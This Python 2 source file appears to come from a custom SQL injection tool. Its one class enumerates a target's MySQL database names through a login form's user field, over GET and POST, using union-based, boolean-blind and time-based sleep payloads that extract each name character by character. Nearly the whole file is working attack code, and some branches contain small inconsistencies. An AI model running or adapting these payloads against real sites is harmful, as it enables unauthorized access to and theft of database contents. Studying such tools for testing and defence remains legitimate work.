#!/usr/bin/env python
# -*- coding:utf-8 -*-
from config import UnpackFunction
from lib.log import logger
from test import SqliTest
from tqdm import trange
from tqdm import tqdm

__author__ = "LoRexxar"

# 居然忘记了database也要注...


class SqliDatabases(SqliTest):
    def __init__(self):
        SqliTest.__init__(self)
        if self.len == 0:
            SqliTest.test(self, output=0)

    def get_database(self):

        if self.sqlirequest == "GET":
            logger.debug("The sqlirequest is %s, start sqli databases..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database amount sqli...")
                # 先注databases的数量
                payload = "user=ddog123' union SELECT 1,COUNT(SCHEMA_NAME) from information_schema.SCHEMATA  limit 0,1%23&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                databases_number = int(UnpackFunction(r))
                logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                print "[*] databases_number: %d" % databases_number

                # 每个循环跑一次databases的数据
                for i in trange(int(databases_number), desc="Database sqli...", leave=False):
                    # 首先是database name的长度
                    logger.debug("Start %dth database length sqli..." % (i + 1))
                    payload = "user=ddog123' union SELECT 1,length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                        i) + ",1%23&passwd=ddog123&submit=Log+In"
                    r = self.Data.GetData(payload)
                    databases_name_len = int(UnpackFunction(r))
                    logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                    logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))

                    # 然后注database name
                    logger.debug("Start %dth database name sqli..." % (i + 1))
                    payload = "user=ddog123' union SELECT 1,SCHEMA_NAME from information_schema.SCHEMATA limit " + repr(
                        i) + ",1%23&passwd=ddog123&submit=Log+In"
                    r = self.Data.GetData(payload)
                    databases_name = UnpackFunction(r)
                    logger.debug("%dth Databases name sqli success...The databases_name is %s..." % ((i + 1), databases_name))

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)
                    logger.info("[*] %dth databases_name: %s" % ((i + 1), databases_name))

            elif self.sqlimethod == "build":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database amount sqli...")

                for i in trange(100, desc='Database amount sqli', leave=False):
                    # 先注databases的数量
                    payload = "user=user1' %26%26 (SElECT ((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
                        i) + "))%23&passwd=ddog123&submit=Log+In"
                    if self.Data.GetBuildData(payload, self.len) == 0:
                        databases_number = i
                        break

                logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                logger.info("[*] databases_number: %d" % databases_number)

                for i in range(0, int(databases_number)):

                    logger.debug("Start %dth database length sqli..." % (i + 1))
                    # 然后注databases_name 的 length
                    for j in trange(30, desc="%dth Database length sqli..." % (i + 1), leave=False):
                        payload = "user=user1' %26%26  (select ((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(i) + ",1) > " + repr(j) + "))%23&passwd=ddog123&submit=Log+In"
                        if self.Data.GetBuildData(payload, self.len) == 0:
                            databases_name_len = j
                            break

                    logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                    logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))

                    # 然后注databases名字
                    # 清空database_name
                    databases_name = ""
                    logger.debug("Start %dth database sqli..." % (i + 1))
                    for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):
                        for k in trange(100, desc='%dth Database\'s %dth char sqli' % ((i + 1), (j + 1)), leave=False):
                            payload = "user=user1' %26%26 (select (SELECT ascii(substring(SCHEMA_NAME," + repr(
                                j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
                                i) + ",1) >" + repr(k + 30) + ")%23&passwd=ddog123&submit=Log+In"
                            if self.Data.GetBuildData(payload, self.len) == 0:
                                databases_name += chr(int(k + 30))
                                break

                    logger.debug("%dth Databases name sqli success...The databases_name is %s..." % ((i + 1), databases_name))

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)

                    logger.info("[*] %dth databases_name: %s" % ((i + 1), databases_name))

            elif self.sqlimethod == "time":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database amount sqli...")

                for i in trange(100, desc='Database amount sqli', leave=False):
                    # 先注databases的数量
                    payload = "user=admi' union  SELECT 1,if((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
                        i) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
                    if self.Data.GetTimeData(payload, self.time) == 0:
                        databases_number = i
                        break

                logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                logger.info("[*] databases_number: %d" % databases_number)

                for i in range(0, int(databases_number)):
                    logger.debug("Start %dth database length sqli..." % (i + 1))

                    # 然后注databases_name 的 length
                    for j in trange(30, desc="%dth Database length sqli..." % (i + 1), leave=False):
                        payload = "user=ddog' union  SELECT 1,if((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                            i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"

                        if self.Data.GetTimeData(payload, self.time) == 0:
                            databases_name_len = j
                            break

                    logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                    logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))

                    # 然后注databases名字
                    # 清空databases_name
                    databases_name = ""
                    logger.debug("Start %dth database sqli..." % (i + 1))

                    for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):
                        for k in trange(100, desc='%dth Database\'s %dth char sqli' % ((i + 1), (j + 1)), leave=False):
                            payload = "user=admi' union SELECT 1,if((SELECT  ascii(substring(SCHEMA_NAME," + repr(
                                j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
                                i) + ",1) > " + repr(k + 30) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"

                            if self.Data.GetTimeData(payload, self.time) == 0:
                                databases_name += chr(int(k + 30))
                                break

                    logger.debug("%dth Databases name sqli success...The databases_name is %s..." % ((i + 1), databases_name))

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)

                    logger.info("[*] %dth databases_name: %s" % ((i + 1), databases_name))

        # 然后是post
        elif self.sqlirequest == "POST":
            logger.debug("The sqlirequest is %s, start sqli databases..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database amount sqli...")

                # 先注databases的数量
                payload = {
                    "user": "ddog123' union SELECT 1,COUNT(SCHEMA_NAME) from information_schema.SCHEMATA  limit 0,1#",
                    "passwd": "ddog123"}
                r = self.Data.PostData(payload)
                databases_number = int(UnpackFunction(r))
                logger.debug("Databases account sqli success...The databases_number is %d..." % databases_number)
                print "[*] databases_number: %d" % databases_number

                # 每个循环跑一次databases的数据
                for i in trange(int(databases_number), desc="Database sqli...", leave=False):
                    # 首先是database name的长度
                    payload = {
                        "user": "ddog123' union  SELECT 1,length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                            i) + ",1#", "passwd": "ddog123&submit=Log+In"}
                    r = self.Data.PostData(payload)
                    databases_name_len = int(UnpackFunction(r))
                    logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                    logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))

                    # 然后注database name
                    logger.debug("Start %dth database name sqli..." % (i + 1))
                    payload = {
                        "user": "ddog123' union SELECT 1,SCHEMA_NAME from information_schema.SCHEMATA limit " + repr(
                            i) + ",1#", "passwd": "ddog123"}
                    r = self.Data.PostData(payload)
                    databases_name = UnpackFunction(r)
                    logger.debug("%dth Databases name sqli success...The databases_name is %s..." % ((i + 1), databases_name))

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)
                    logger.info("[*] %dth databases_name: %s" % ((i + 1), databases_name))

            elif self.sqlimethod == "build":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database amount sqli...")

                for i in trange(100, desc='Database amount sqli', leave=False):
                    # 先注databases的数量
                    payload = {
                        "user": "user1' && (SElECT ((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
                            i) + "))#", "passwd": "ddog123"}
                    if self.Data.PostBuildData(payload, self.len) == 0:
                        databases_number = i
                        break

                logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                logger.info("[*] databases_number: %d" % databases_number)

                for i in range(0, int(databases_number)):

                    # 然后注databases_name 的 length
                    logger.debug("Start %dth database length sqli..." % (i + 1))
                    for j in trange(30, desc="%dth Database length sqli..." % (i + 1), leave=False):
                        payload = {
                            "user": "user1' && (select ((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                                i) + ",1) > " + repr(j) + "))#", "passwd": "ddog123"}
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            databases_name_len = j
                            break

                    logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                    logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))

                    # 然后注databases名字
                    # 清空databases_name
                    databases_name = ""
                    logger.debug("Start %dth database sqli..." % (i + 1))

                    for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):
                        for k in trange(100, desc='%dth Database\'s %dth char sqli' % ((i + 1), (j + 1)), leave=False):

                            payload = {"user": "user1' && (select ((SELECT ascii(substring(SCHEMA_NAME," + repr(
                                j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
                                i) + ",1) >" + repr(k + 30) + "))#", "passwd": "ddog123"}
                            if self.Data.PostBuildData(payload, self.len) == 0:
                                databases_name += chr(int(k + 30))
                                break

                    logger.debug("%dth Databases name sqli success...The databases_name is %s..." % (
                                (i + 1), databases_name))

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)

                    logger.info("[*] %dth databases_name: %s" % ((i + 1), databases_name))

            elif self.sqlimethod == "time":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database amount sqli...")

                for i in trange(100, desc='Database amount sqli', leave=False):
                    # 先注databases的数量
                    payload = {
                        "user": "admi' union SELECT 1,if((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
                            i) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
                    if self.Data.PostTimeData(payload, self.time) == 0:
                        databases_number = i
                        break

                logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                logger.info("[*] databases_number: %d" % databases_number)

                for i in range(0, int(databases_number)):
                    # 然后注databases_number 的length

                    logger.debug("Start %dth database length sqli..." % (i + 1))
                    for j in trange(30, desc="%dth Database length sqli..." % (i + 1), leave=False):
                        payload = {
                            "user": "admi' union SELECT 1,if((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                                i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}

                        if self.Data.PostTimeData(payload, self.time) == 0:
                            databases_name_len = j
                            break

                    logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                    logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))

                    # 然后注databases名字
                    # 清空databases_name
                    databases_name = ""
                    logger.debug("Start %dth database sqli..." % (i + 1))

                    for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):
                        for k in trange(100, desc='%dth Database\'s %dth char sqli' % ((i + 1), (j + 1)), leave=False):
                            payload = {"user": "admi' union SELECT 1,if((SELECT  ascii(substring(SCHEMA_NAME," + repr(
                                j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
                                i) + ",1) > " + repr(k) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
                            if self.Data.PostTimeData(payload, self.time) == 0:
                                databases_name += chr(int(k))
                                break

                    logger.debug("%dth Databases name sqli success...The databases_name is %s..." % (
                        (i + 1), databases_name))

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)

                    logger.info("[*] %dth databases_name: %s" % ((i + 1), databases_name))

        databases_name = ','.join(self.databases_name)
        print "[*] databases_name list: " + databases_name
